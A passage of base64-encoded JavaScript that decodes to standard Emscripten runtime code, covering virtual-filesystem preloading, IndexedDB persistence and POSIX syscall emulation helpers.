kRmlsZTogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSwgdXJsLCBjYW5SZWFkLCBjYW5Xcml0ZSwgb25sb2FkLCBvbmVycm9yLCBkb250Q3JlYXRlRmlsZSwgY2FuT3duLCBwcmVGaW5pc2gpIHsKICAgICAgICBCcm93c2VyLmluaXQoKTsKICAgICAgICB2YXIgZnVsbG5hbWUgPSBuYW1lID8gUEFUSC5yZXNvbHZlKFBBVEguam9pbjIocGFyZW50LCBuYW1lKSkgOiBwYXJlbnQ7CiAgICAgICAgdmFyIGRlcCA9IGdldFVuaXF1ZVJ1bkRlcGVuZGVuY3koImNwICIgKyBmdWxsbmFtZSk7CgogICAgICAgIGZ1bmN0aW9uIHByb2Nlc3NEYXRhKGJ5dGVBcnJheSkgewogICAgICAgICAgICBmdW5jdGlvbiBmaW5pc2goYnl0ZUFycmF5KSB7CiAgICAgICAgICAgICAgICBpZihwcmVGaW5pc2gpIHByZUZpbmlzaCgpOwogICAgICAgICAgICAgICAgaWYoIWRvbnRDcmVhdGVGaWxlKSB7CiAgICAgICAgICAgICAgICAgICAgRlMuY3JlYXRlRGF0YUZpbGUocGFyZW50LCBuYW1lLCBieXRlQXJyYXksIGNhblJlYWQsIGNhbldyaXRlLCBjYW5Pd24pCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZihvbmxvYWQpIG9ubG9hZCgpOwogICAgICAgICAgICAgICAgcmVtb3ZlUnVuRGVwZW5kZW5jeShkZXApCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIHZhciBoYW5kbGVkID0gZmFsc2U7CiAgICAgICAgICAgIE1vZHVsZVsicHJlbG9hZFBsdWdpbnMiXS5mb3JFYWNoKChmdW5jdGlvbihwbHVnaW4pIHsKICAgICAgICAgICAgICAgIGlmKGhhbmRsZWQpIHJldHVybjsKICAgICAgICAgICAgICAgIGlmKHBsdWdpblsiY2FuSGFuZGxlIl0oZnVsbG5hbWUpKSB7CiAgICAgICAgICAgICAgICAgICAgcGx1Z2luWyJoYW5kbGUiXShieXRlQXJyYXksIGZ1bGxuYW1lLCBmaW5pc2gsIChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYob25lcnJvcikgb25lcnJvcigpOwogICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVSdW5EZXBlbmRlbmN5KGRlcCkKICAgICAgICAgICAgICAgICAgICB9KSk7CiAgICAgICAgICAgICAgICAgICAgaGFuZGxlZCA9IHRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSkpOwogICAgICAgICAgICBpZighaGFuZGxlZCkgZmluaXNoKGJ5dGVBcnJheSkKICAgICAgICB9CgogICAgICAgIGFkZFJ1bkRlcGVuZGVuY3koZGVwKTsKICAgICAgICBpZih0eXBlb2YgdXJsID09ICJzdHJpbmciKSB7CiAgICAgICAgICAgIEJyb3dzZXIuYXN5bmNMb2FkKHVybCwgKGZ1bmN0aW9uKGJ5dGVBcnJheSkgewogICAgICAgICAgICAgICAgcHJvY2Vzc0RhdGEoYnl0ZUFycmF5KQogICAgICAgICAgICB9KSwgb25lcnJvcikKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBwcm9jZXNzRGF0YSh1cmwpCiAgICAgICAgfQogICAgfSksCiAgICBpbmRleGVkREI6IChmdW5jdGlvbigpIHsKICAgICAgICByZXR1cm4gd2luZG93LmluZGV4ZWREQiB8fCB3aW5kb3cubW96SW5kZXhlZERCIHx8IHdpbmRvdy53ZWJraXRJbmRleGVkREIgfHwgd2luZG93Lm1zSW5kZXhlZERCCiAgICB9KSwKICAgIERCX05BTUU6IChmdW5jdGlvbigpIHsKICAgICAgICByZXR1cm4gIkVNX0ZTXyIgKyB3aW5kb3cubG9jYXRpb24ucGF0aG5hbWUKICAgIH0pLAogICAgREJfVkVSU0lPTjogMjAsCiAgICBEQl9TVE9SRV9OQU1FOiAiRklMRV9EQVRBIiwKICAgIHNhdmVGaWxlc1RvREI6IChmdW5jdGlvbihwYXRocywgb25sb2FkLCBvbmVycm9yKSB7CiAgICAgICAgb25sb2FkID0gb25sb2FkIHx8IChmdW5jdGlvbigpIHsKICAgICAgICB9KTsKICAgICAgICBvbmVycm9yID0gb25lcnJvciB8fCAoZnVuY3Rpb24oKSB7CiAgICAgICAgfSk7CiAgICAgICAgdmFyIGluZGV4ZWREQiA9IEZTLmluZGV4ZWREQigpOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBvcGVuUmVxdWVzdCA9IGluZGV4ZWREQi5vcGVuKEZTLkRCX05BTUUoKSwgRlMuREJfVkVSU0lPTikKICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgcmV0dXJuIG9uZXJyb3IoZSkKICAgICAgICB9CiAgICAgICAgb3BlblJlcXVlc3Qub251cGdyYWRlbmVlZGVkID0gZnVuY3Rpb24gb3BlblJlcXVlc3Rfb251cGdyYWRlbmVlZGVkKCkgewogICAgICAgICAgICBjb25zb2xlLmxvZygiY3JlYXRpbmcgZGIiKTsKICAgICAgICAgICAgdmFyIGRiID0gb3BlblJlcXVlc3QucmVzdWx0OwogICAgICAgICAgICBkYi5jcmVhdGVPYmplY3RTdG9yZShGUy5EQl9TVE9SRV9OQU1FKQogICAgICAgIH07CiAgICAgICAgb3BlblJlcXVlc3Qub25zdWNjZXNzID0gZnVuY3Rpb24gb3BlblJlcXVlc3Rfb25zdWNjZXNzKCkgewogICAgICAgICAgICB2YXIgZGIgPSBvcGVuUmVxdWVzdC5yZXN1bHQ7CiAgICAgICAgICAgIHZhciB0cmFuc2FjdGlvbiA9IGRiLnRyYW5zYWN0aW9uKFtGUy5EQl9TVE9SRV9OQU1FXSwgInJlYWR3cml0ZSIpOwogICAgICAgICAgICB2YXIgZmlsZXMgPSB0cmFuc2FjdGlvbi5vYmplY3RTdG9yZShGUy5EQl9TVE9SRV9OQU1FKTsKICAgICAgICAgICAgdmFyIG9rID0gMCwgZmFpbCA9IDAsIHRvdGFsID0gcGF0aHMubGVuZ3RoOwoKICAgICAgICAgICAgZnVuY3Rpb24gZmluaXNoKCkgewogICAgICAgICAgICAgICAgaWYoZmFpbCA9PSAwKSBvbmxvYWQoKTsgZWxzZSBvbmVycm9yKCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcGF0aHMuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCkgewogICAgICAgICAgICAgICAgdmFyIHB1dFJlcXVlc3QgPSBmaWxlcy5wdXQoRlMuYW5hbHl6ZVBhdGgocGF0aCkub2JqZWN0LmNvbnRlbnRzLCBwYXRoKTsKICAgICAgICAgICAgICAgIHB1dFJlcXVlc3Qub25zdWNjZXNzID0gZnVuY3Rpb24gcHV0UmVxdWVzdF9vbnN1Y2Nlc3MoKSB7CiAgICAgICAgICAgICAgICAgICAgb2srKzsKICAgICAgICAgICAgICAgICAgICBpZihvayArIGZhaWwgPT0gdG90YWwpIGZpbmlzaCgpCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgcHV0UmVxdWVzdC5vbmVycm9yID0gZnVuY3Rpb24gcHV0UmVxdWVzdF9vbmVycm9yKCkgewogICAgICAgICAgICAgICAgICAgIGZhaWwrKzsKICAgICAgICAgICAgICAgICAgICBpZihvayArIGZhaWwgPT0gdG90YWwpIGZpbmlzaCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgdHJhbnNhY3Rpb24ub25lcnJvciA9IG9uZXJyb3IKICAgICAgICB9OwogICAgICAgIG9wZW5SZXF1ZXN0Lm9uZXJyb3IgPSBvbmVycm9yCiAgICB9KSwKICAgIGxvYWRGaWxlc0Zyb21EQjogKGZ1bmN0aW9uKHBhdGhzLCBvbmxvYWQsIG9uZXJyb3IpIHsKICAgICAgICBvbmxvYWQgPSBvbmxvYWQgfHwgKGZ1bmN0aW9uKCkgewogICAgICAgIH0pOwogICAgICAgIG9uZXJyb3IgPSBvbmVycm9yIHx8IChmdW5jdGlvbigpIHsKICAgICAgICB9KTsKICAgICAgICB2YXIgaW5kZXhlZERCID0gRlMuaW5kZXhlZERCKCk7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgdmFyIG9wZW5SZXF1ZXN0ID0gaW5kZXhlZERCLm9wZW4oRlMuREJfTkFNRSgpLCBGUy5EQl9WRVJTSU9OKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICByZXR1cm4gb25lcnJvcihlKQogICAgICAgIH0KICAgICAgICBvcGVuUmVxdWVzdC5vbnVwZ3JhZGVuZWVkZWQgPSBvbmVycm9yOwogICAgICAgIG9wZW5SZXF1ZXN0Lm9uc3VjY2VzcyA9IGZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2VzcygpIHsKICAgICAgICAgICAgdmFyIGRiID0gb3BlblJlcXVlc3QucmVzdWx0OwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgdmFyIHRyYW5zYWN0aW9uID0gZGIudHJhbnNhY3Rpb24oW0ZTLkRCX1NUT1JFX05BTUVdLCAicmVhZG9ubHkiKQogICAgICAgICAgICB9IGNhdGNoKGUpIHsKICAgICAgICAgICAgICAgIG9uZXJyb3IoZSk7CiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICB2YXIgZmlsZXMgPSB0cmFuc2FjdGlvbi5vYmplY3RTdG9yZShGUy5EQl9TVE9SRV9OQU1FKTsKICAgICAgICAgICAgdmFyIG9rID0gMCwgZmFpbCA9IDAsIHRvdGFsID0gcGF0aHMubGVuZ3RoOwoKICAgICAgICAgICAgZnVuY3Rpb24gZmluaXNoKCkgewogICAgICAgICAgICAgICAgaWYoZmFpbCA9PSAwKSBvbmxvYWQoKTsgZWxzZSBvbmVycm9yKCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcGF0aHMuZm9yRWFjaCgoZnVuY3Rpb24ocGF0aCkgewogICAgICAgICAgICAgICAgdmFyIGdldFJlcXVlc3QgPSBmaWxlcy5nZXQocGF0aCk7CiAgICAgICAgICAgICAgICBnZXRSZXF1ZXN0Lm9uc3VjY2VzcyA9IGZ1bmN0aW9uIGdldFJlcXVlc3Rfb25zdWNjZXNzKCkgewogICAgICAgICAgICAgICAgICAgIGlmKEZTLmFuYWx5emVQYXRoKHBhdGgpLmV4aXN0cykgewogICAgICAgICAgICAgICAgICAgICAgICBGUy51bmxpbmsocGF0aCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgRlMuY3JlYXRlRGF0YUZpbGUoUEFUSC5kaXJuYW1lKHBhdGgpLCBQQVRILmJhc2VuYW1lKHBhdGgpLCBnZXRSZXF1ZXN0LnJlc3VsdCwgdHJ1ZSwgdHJ1ZSwgdHJ1ZSk7CiAgICAgICAgICAgICAgICAgICAgb2srKzsKICAgICAgICAgICAgICAgICAgICBpZihvayArIGZhaWwgPT0gdG90YWwpIGZpbmlzaCgpCiAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgZ2V0UmVxdWVzdC5vbmVycm9yID0gZnVuY3Rpb24gZ2V0UmVxdWVzdF9vbmVycm9yKCkgewogICAgICAgICAgICAgICAgICAgIGZhaWwrKzsKICAgICAgICAgICAgICAgICAgICBpZihvayArIGZhaWwgPT0gdG90YWwpIGZpbmlzaCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgdHJhbnNhY3Rpb24ub25lcnJvciA9IG9uZXJyb3IKICAgICAgICB9OwogICAgICAgIG9wZW5SZXF1ZXN0Lm9uZXJyb3IgPSBvbmVycm9yCiAgICB9KQp9Owp2YXIgU1lTQ0FMTFMgPSB7CiAgICBERUZBVUxUX1BPTExNQVNLOiA1LCBtYXBwaW5nczoge30sIHVtYXNrOiA1MTEsIGNhbGN1bGF0ZUF0OiAoZnVuY3Rpb24oZGlyZmQsIHBhdGgpIHsKICAgICAgICBpZihwYXRoWzBdICE9PSAiLyIpIHsKICAgICAgICAgICAgdmFyIGRpcjsKICAgICAgICAgICAgaWYoZGlyZmQgPT09IC0xMDApIHsKICAgICAgICAgICAgICAgIGRpciA9IEZTLmN3ZCgpCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICB2YXIgZGlyc3RyZWFtID0gRlMuZ2V0U3RyZWFtKGRpcmZkKTsKICAgICAgICAgICAgICAgIGlmKCFkaXJzdHJlYW0pIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKTsKICAgICAgICAgICAgICAgIGRpciA9IGRpcnN0cmVhbS5wYXRoCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGF0aCA9IFBBVEguam9pbjIoZGlyLCBwYXRoKQogICAgICAgIH0KICAgICAgICByZXR1cm4gcGF0aAogICAgfSksIGRvU3RhdDogKGZ1bmN0aW9uKGZ1bmMsIHBhdGgsIGJ1ZikgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIHZhciBzdGF0ID0gZnVuYyhwYXRoKQogICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICBpZihlICYmIGUubm9kZSAmJiBQQVRILm5vcm1hbGl6ZShwYXRoKSAhPT0gUEFUSC5ub3JtYWxpemUoRlMuZ2V0UGF0aChlLm5vZGUpKSkgewogICAgICAgICAgICAgICAgcmV0dXJuIC1FUlJOT19DT0RFUy5FTk9URElSCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGhyb3cgZQogICAgICAgIH0KICAgICAgICBIRUFQMzJbYnVmID4+IDJdID0gc3RhdC5kZXY7CiAgICAgICAgSEVBUDMyW2J1ZiArIDQgPj4gMl0gPSAwOwogICAgICAgIEhFQVAzMltidWYgKyA4ID4+IDJdID0gc3RhdC5pbm87CiAgICAgICAgSEVBUDMyW2J1ZiArIDEyID4+IDJdID0gc3RhdC5tb2RlOwogICAgICAgIEhFQVAzMltidWYgKyAxNiA+PiAyXSA9IHN0YXQubmxpbms7CiAgICAgICAgSEVBUDMyW2J1ZiArIDIwID4+IDJdID0gc3RhdC51aWQ7CiAgICAgICAgSEVBUDMyW2J1ZiArIDI0ID4+IDJdID0gc3RhdC5naWQ7CiAgICAgICAgSEVBUDMyW2J1ZiArIDI4ID4+IDJdID0gc3RhdC5yZGV2OwogICAgICAgIEhFQVAzMltidWYgKyAzMiA+PiAyXSA9IDA7CiAgICAgICAgSEVBUDMyW2J1ZiArIDM2ID4+IDJdID0gc3RhdC5zaXplOwogICAgICAgIEhFQVAzMltidWYgKyA0MCA+PiAyXSA9IDQwOTY7CiAgICAgICAgSEVBUDMyW2J1ZiArIDQ0ID4+IDJdID0gc3RhdC5ibG9ja3M7CiAgICAgICAgSEVBUDMyW2J1ZiArIDQ4ID4+IDJdID0gc3RhdC5hdGltZS5nZXRUaW1lKCkgLyAxZTMgfCAwOwogICAgICAgIEhFQVAzMltidWYgKyA1MiA+PiAyXSA9IDA7CiAgICAgICAgSEVBUDMyW2J1ZiArIDU2ID4+IDJdID0gc3RhdC5tdGltZS5nZXRUaW1lKCkgLyAxZTMgfCAwOwogICAgICAgIEhFQVAzMltidWYgKyA2MCA+PiAyXSA9IDA7CiAgICAgICAgSEVBUDMyW2J1ZiArIDY0ID4+IDJdID0gc3RhdC5jdGltZS5nZXRUaW1lKCkgLyAxZTMgfCAwOwogICAgICAgIEhFQVAzMltidWYgKyA2OCA+PiAyXSA9IDA7CiAgICAgICAgSEVBUDMyW2J1ZiArIDcyID4+IDJdID0gc3RhdC5pbm87CiAgICAgICAgcmV0dXJuIDAKICAgIH0pLCBkb01zeW5jOiAoZnVuY3Rpb24oYWRkciwgc3RyZWFtLCBsZW4sIGZsYWdzKSB7CiAgICAgICAgdmFyIGJ1ZmZlciA9IG5ldyBVaW50OEFycmF5KEhFQVBVOC5zdWJhcnJheShhZGRyLCBhZGRyICsgbGVuKSk7CiAgICAgICAgRlMubXN5bmMoc3RyZWFtLCBidWZmZXIsIDAsIGxlbiwgZmxhZ3MpCiAgICB9KSwgZG9Na2RpcjogKGZ1bmN0aW9uKHBhdGgsIG1vZGUpIHsKICAgICAgICBwYXRoID0gUEFUSC5ub3JtYWxpemUocGF0aCk7CiAgICAgICAgaWYocGF0aFtwYXRoLmxlbmd0aCAtIDFdID09PSAiLyIpIHBhdGggPSBwYXRoLnN1YnN0cigwLCBwYXRoLmxlbmd0aCAtIDEpOwogICAgICAgIEZTLm1rZGlyKHBhdGgsIG1vZGUsIDApOwogICAgICAgIHJldHVybiAwCiAgICB9KSwgZG9Na25vZDogKGZ1bmN0aW9uKHBhdGgsIG1vZGUsIGRldikgewogICAgICAgIHN3aXRjaChtb2RlICYgNjE0NDApIHsKICAgICAgICAgICAgY2FzZSAzMjc2ODoKICAgICAgICAgICAgY2FzZSA4MTkyOgogICAgICAgICAgICBjYXNlIDI0NTc2OgogICAgICAgICAgICBjYXNlIDQwOTY6CiAgICAgICAgICAgIGNhc2UgNDkxNTI6CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIHJldHVybiAtRVJSTk9fQ09ERVMuRUlOVkFMCiAgICAgICAgfQogICAgICAgIEZTLm1rbm9kKHBhdGgsIG1vZGUsIGRldik7CiAgICAgICAgcmV0dXJuIDAKICAgIH0pLCBkb1JlYWRsaW5rOiAoZnVuY3Rpb24ocGF0aCwgYnVmLCBidWZzaXplKSB7CiAgICAgICAgaWYoYnVmc2l6ZSA8PSAwKSByZXR1cm4gLUVSUk5PX0NPREVTLkVJTlZBTDsKICAgICAgICB2YXIgcmV0ID0gRlMucmVhZGxpbmsocGF0aCk7CiAgICAgICAgdmFyIGxlbiA9IE1hdGgubWluKGJ1ZnNpemUsIGxlbmd0aEJ5dGVzVVRGOChyZXQpKTsKICAgICAgICB2YXIgZW5kQ2hhciA9IEhFQVA4W2J1ZiArIGxlbl07CiAgICAgICAgc3RyaW5nVG9VVEY4KHJldCwgYnVmLCBidWZzaXplICsgMSk7CiAgICAgICAgSEVBUDhbYnVmICsgbGVuXSA9IGVuZENoYXI7CiAgICAgICAgcmV0dXJuIGxlbgogICAgfSksIGRvQWNjZXNzOiAoZnVuY3Rpb24ocGF0aCwgYW1vZGUpIHsKICAgICAgICBpZihhbW9kZSAmIH43KSB7CiAgICAgICAgICAgIHJldHVybiAtRVJSTk9fQ09ERVMuRUlOVkFMCiAgICAgICAgfQogICAgICAgIHZhciBub2RlOwogICAgICAgIHZhciBsb29rdXAgPSBGUy5sb29rdXBQYXRoKHBhdGgsIHtmb2xsb3c6IHRydWV9KTsKICAgICAgICBub2RlID0gbG9va3VwLm5vZGU7CiAgICAgICAgdmFyIHBlcm1zID0gIiI7CiAgICAgICAgaWYoYW1vZGUgJiA0KSBwZXJtcyArPSAiciI7CiAgICAgICAgaWYoYW1vZGUgJiAyKSBwZXJtcyArPSAidyI7CiAgICAgICAgaWYoYW1vZGUgJiAxKSBwZXJtcyArPSAieCI7CiAgICAgICAgaWYocGVybXMgJiYgRlMubm9kZVBlcm1pc3Npb25zKG5vZGUsIHBlcm1zKSkgewogICAgICAgICAgICByZXR1cm4gLUVSUk5PX0NPREVTLkVBQ0NFUwogICAgICAgIH0KICAgICAgICByZXR1cm4gMAogICAgfSksIGRvRHVwOiAoZnVuY3Rpb24ocGF0aCwgZmxhZ3MsIHN1Z2dlc3RGRCkgewogICAgICAgIHZhciBzdWdnZXN0ID0gRlMuZ2V0U3RyZWFtKHN1Z2dlc3RGRCk7CiAgICAgICAgaWYoc3VnZ2VzdCkgRlMuY2xvc2Uoc3VnZ2VzdCk7CiAgICAgICAgcmV0dXJuIEZTLm9wZW4ocGF0aCwgZmxhZ3MsIDAsIHN1Z2dlc3RGRCwgc3VnZ2VzdEZEKS5mZAogICAgfSksIGRvUmVhZHY6IChmdW5jdGlvbihzdHJlYW0sIGlvdiwgaW92Y250LCBvZmZzZXQpIHsKICAgICAgICB2YXIgcmV0ID0gMDsKICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgaW92Y250OyBpKyspIHsKICAgICAgICAgICAgdmFyIHB0ciA9IEhFQVAzMltpb3YgKyBpICogOCA+PiAyXTsKICAgICAgICAgICAgdmFyIGxlbiA9IEhFQVAzMltpb3YgKyAoaSAqIDggKyA0KSA+PiAyXTsKICAgICAgICAgICAgdmFyIGN1cnIgPSBGUy5yZWFkKHN0cmVhbSwgSEVBUDgsIHB0ciwgbGVuLCBvZmZzZXQpOwogICAgICAgICAgICBpZihjdXJyIDwgMCkgcmV0dXJuIC0xOwogICAgICAgICAgICByZXQgKz0gY3VycjsKICAgICAgICAgICAgaWYoY3VyciA8IGxlbikgYnJlYWsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksIGRvV3JpdGV2OiAoZnVuY3Rpb24oc3RyZWFtLCBpb3YsIGlvdmNudCwgb2Zmc2V0KSB7CiAgICAgICAgdmFyIHJldCA9IDA7CiAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IGlvdmNudDsgaSsrKSB7CiAgICAgICAgICAgIHZhciBwdHIgPSBIRUFQMzJbaW92ICsgaSAqIDggPj4gMl07CiAgICAgICAgICAgIHZhciBsZW4gPSBIRUFQMzJbaW92ICsgKGkgKiA4ICsgNCkgPj4gMl07CiAgICAgICAgICAgIHZhciBjdXJyID0gRlMud3JpdGUoc3RyZWFtLCBIRUFQOCwgcHRyLCBsZW4sIG9mZnNldCk7CiAgICAgICAgICAgIGlmKGN1cnIgPCAwKSByZXR1cm4gLTE7CiAgICAgICAgICAgIHJldCArPSBjdXJyCiAgICAgICAgfQogICAgICAgIHJldHVybiByZXQKICAgIH0pLCB2YXJhcmdzOiAwLCBnZXQ6IChmdW5jdGlvbih2YXJhcmdzKSB7CiAgICAgICAgU1lTQ0FMTFMudmFyYXJncyArPSA0OwogICAgICAgIHZhciByZXQgPSBIRUFQMzJbU1lTQ0FMTFMudmFyYXJncyAtIDQgPj4gMl07CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksIGdldFN0cjogKGZ1bmN0aW9uKCkgewogICAgICAgIHZhciByZXQgPSBQb2ludGVyX3N0cmluZ2lmeShTWVNDQUxMUy5nZXQoKSk7CiAgICAgICAgcmV0dXJuIHJldAogICAgfSksIGdldFN0cmVhbUZyb21GRDogKGZ1bmN0aW9uKCkgewogICAgICAgIHZhciBzdHJlYW0gPSBGUy5nZXRTdHJlYW0oU1lTQ0FMTFMuZ2V0KCkpOwogICAgICAgIGlmKCFzdHJlYW0pIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKTsKICAgICAgICByZXR1cm4gc3RyZWFtCiAgICB9KSwgZ2V0U29ja2V0RnJvbUZEOiAoZnVuY3Rpb24oKSB7CiAgICAgICAgdmFyIHNvY2tldCA9IFNPQ0tGUy5nZXRTb2NrZXQoU1lTQ0FMTFMuZ2V0KCkpOwogICAgICAgIGlmKCFzb2NrZXQpIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVCQURGKTsKICAgICAgICByZXR1cm4gc29ja2V0CiAgICB9KSwgZ2V0U29ja2V0QWRkcmVzczogKGZ1bmN0aW9uKGFsbG93TnVsbCkgewogICAgICAgIHZhciBhZGRycCA9IFNZU0NBTExTLmdldCgpLCBhZGRybGVuID0gU1lTQ0FMTFMuZ2V0KCk7CiAgICAgICAgaWYoYWxsb3dOdWxsICYmIGFkZHJwID09PSAwKSByZXR1cm4gbnVsbDsKICAgICAgICB2YXIgaW5mbyA9IF9fcmVhZF9zb2NrYWRkcihhZGRycCwgYWRkcmxlbik7CiAgICAgICAgaWYoaW5mby5lcnJubykgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoaW5mby5lcnJubyk7CiAgICAgICAgaW5mby5hZGRyID0gRE5TLmxvb2t1cF9hZGRyKGluZm8uYWRkcikgfHwgaW5mby5hZGRyOwogICAgICAgIHJldHVybiBpbmZvCiAgICB9KSwgZ2V0NjQ6IChmdW5jdGlvbigpIHsKICAgICAgICB2YXIgbG93ID0gU1lTQ0FMTFMuZ2V0KCksIGhpZ2ggPSBTWVNDQUxMUy5nZXQoKTsKICAgICAgICBpZihsb3cgPj0gMCkgYXNzZXJ0KGhpZ2ggPT09IDApOyBlbHNlIGFzc2VydChoaWdoID09PSAtMSk7CiAgICAgICAgcmV0dXJuIGxvdwogICAgfSksIGdldFplcm86IChmdW5jdGlvbigpIHsKICAgICAgICBhc3NlcnQoU1lTQ0FMTFMuZ2V0KCkgPT09IDApCiAgICB9KQp9OwoKZnVuY3Rpb24gX19fc3lzY2FsbDIwKHdoaWNoLCB2YXJhcmdzKSB7CiAgICBTWVNDQUxMUy52YXJhcmdzID0gdmFyYXJnczsKICAgIHRyeSB7CiAgICAgICAgcmV0dXJuIFBST0NJTkZPLnBpZAogICAgfSBjYXRjaChlKSB7CiAgICAgICAgaWYodHlwZW9mIEZTID09PSAidW5kZWZpbmVkIiB8fCAhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgYWJvcnQoZSk7CiAgICAgICAgcmV0dXJuIC1lLmVycm5vCiAgICB9Cn0KCnZhciBfX190bV9jdXJyZW50ID0gU1RBVElDVE9QOwpTVEFUSUNUT1AgKz0gNDg7CnZhciBfX190bV90aW1lem9uZSA9IGFsbG9jYXRlKGludEFycmF5RnJvbVN0cmluZygiR01UIiksICJpOCIsIEFMTE9DX1NUQVRJQyk7CgpmdW5jdGlvbiBfZ210aW1lX3IodGltZSwgdG1QdHIpIHsKICAgIHZhciBkYXRlID0gbmV3IERhdGUoSEVBUDMyW3RpbWUgPj4gMl0gKiAxZTMpOwogICAgSEVBUDMyW3RtUHRyID4+IDJdID0gZGF0ZS5nZXRVVENTZWNvbmRzKCk7CiAgICBIRUFQMzJbdG1QdHIgKyA0ID4+IDJdID0gZGF0ZS5nZXRVVENNaW51dGVzKCk7CiAgICBIRUFQMzJbdG1QdHIgKyA4ID4+IDJdID0gZGF0ZS5nZXRVVENIb3VycygpOwogICAgSEVBUDMyW3RtUHRyICsgMTIgPj4gMl0gPSBkYXRlLmdldFVUQ0RhdGUoKTsKICAgIEhFQVAzMlt0bVB0ciArIDE2ID4+IDJdID0gZGF0ZS5nZXRVVENNb250aCgpOwogICAgSEVBUDMyW3RtUHRyICsgMjAgPj4gMl0gPSBkYXRlLmdldFVUQ0Z1bGxZZWFyKCkgLSAxOTAwOwogICAgSEVBUDMyW3RtUHRyICsgMjQgPj4gMl0gPSBkYXRlLmdldFVUQ0RheSgpOwogICAgSEVBUDMyW3RtUHRyICsgMzYgPj4gMl0gPSAwOwogICAgSEVBUDMyW3RtUHRyICsgMzIgPj4gMl0gPSAwOwogICAgdmFyIHN0YXJ0ID0gRGF0ZS5VVEMoZGF0ZS5nZXRVVENGdWxsWWVhcigpLCAwLCAxLCAwLCAwLCAwLCAwKTsKICAgIHZhciB5ZGF5ID0gKGRhdGUuZ2V0VGltZSgpIC0gc3RhcnQpIC8gKDFlMyAqIDYwICogNjAgKiAyNCkgfCAwOwogICAgSEVBUDMyW3RtUHRyICsgMjggPj4gMl0gPSB5ZGF5OwogICAgSEVBUDMyW3RtUHRyICsgNDAgPj4gMl0gPSBfX190bV90aW1lem9uZTsKICAgIHJldHVybiB0bVB0cgp9CgpmdW5jdGlvbiBfZ210aW1lKHRpbWUpIHsKICAgIHJldHVybiBfZ210aW1lX3IodGltZSwgX19fdG1fY3VycmVudCkKfQoKZnVuY3Rpb24gX19fbG9jaygpIHsKfQoKZnVuY3Rpb24gX19fdW5sb2NrKCkgewp9CgpmdW5jdGlvbiBfX19zeXNjYWxsNih3aGljaCwgdmFyYXJncykgewogICAgU1lTQ0FMTFMudmFyYXJncyA9IHZhcmFyZ3M7CiAgICB0cnkgewogICAgICAgIHZhciBzdHJlYW0gPSBTWVNDQUxMUy5nZXRTdHJlYW1Gcm9tRkQoKTsKICAgICAgICBGUy5jbG9zZShzdHJlYW0pOwogICAgICAgIHJldHVybiAwCiAgICB9IGNhdGNoKGUpIHsKICAgICAgICBpZih0eXBlb2YgRlMgPT09ICJ1bmRlZmluZWQiIHx8ICEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKSBhYm9ydChlKTsKICAgICAgICByZXR1cm4gLWUuZXJybm8KICAgIH0KfQoKZnVuY3Rpb24gX2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZyhkZXN0LCBzcmMsIG51bSkgewogICAgSEVBUFU4LnNldChIRUFQVTguc3ViYXJyYXkoc3JjLCBzcmMgKyBudW0pLCBkZXN0KTsKICAgIHJldHVybiBkZXN0Cn0KCmZ1bmN0aW9uIF9mdGltZShwKSB7CiAgICB2YXIgbWlsbGlzID0gRGF0ZS5ub3coKTsKICAgIEhFQVAzMltwID4+IDJdID0gbWlsbGlzIC8gMWUzIHwgMDsKICAgIEhFQVAxNltwICsgNCA+PiAxXSA9IG1pbGxpcyAlIDFlMzsKICAgIEhFQVAxNltwICsgNiA+PiAxXSA9IDA7CiAgICBIRUFQMTZbcCArIDggPj4gMV0gPSAwOwogICAgcmV0dXJuIDAKfQoKZnVuY3Rpb24gX19fc3lzY2FsbDE0MCh3aGljaCwgdmFyYXJncykgewogICAgU1lTQ0FMTFMudmFyYXJncyA9IHZhcmFyZ3M7CiAgICB0cnkgewogICAgICAgIHZhciBzdHJlYW0gPSBTWVNDQUxMUy5nZXRTdHJlYW1Gcm9tRkQoKSwgb2Zmc2V0X2hpZ2ggPSBTWVNDQUxMUy5nZXQoKSwgb2Zmc2V0X2xvdyA9IFNZU0NBTExTLmd